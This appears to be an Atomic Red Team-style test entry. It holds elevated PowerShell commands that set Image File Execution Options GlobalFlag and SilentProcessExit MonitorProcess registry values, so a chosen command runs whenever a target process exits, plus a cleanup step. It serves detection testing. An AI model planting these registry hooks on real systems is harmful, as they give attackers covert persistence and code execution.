- auto_generated_guid: 13117939-c9b2-4a43-999e-0a543df92f0d
  description: "The following Atomic Test will create a GlobalFlag key under Image\
    \ File Execution Options, also a SilentProcessExit Key with ReportingMode and\
    \ MonitorProcess values. This test is similar to a recent CanaryToken that will\
    \ generate an EventCode 3000 in the Application log when a command, whoami.exe\
    \ for example, is executed.\nUpon running Whoami.exe, a command shell will spawn\
    \ and start calc.exe based on the MonitorProcess value. \nUpon successful execution,\
    \ powershell will modify the registry and spawn calc.exe. An event 3000 will generate\
    \ in the Application log.\n"
  executor:
    cleanup_command: "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\\
      CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit\
      \ -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\
      Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force\n"
    command: "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\\
      SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\
      #{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath\
      \ -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\
      \n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\
      \ NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit\
      \ -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value\
      \ -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\
      \nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType\
      \ String -Force\n"
    elevation_required: true
    name: powershell
  input_arguments:
    cmd_to_run:
      default: cmd.exe /c calc.exe
      description: 'Command to execute

        '
      type: string
    process:
      default: whoami.exe
      description: 'Process to monitor

        '
      type: string
  name: GlobalFlags in Image File Execution Options
  supported_platforms:
  - windows
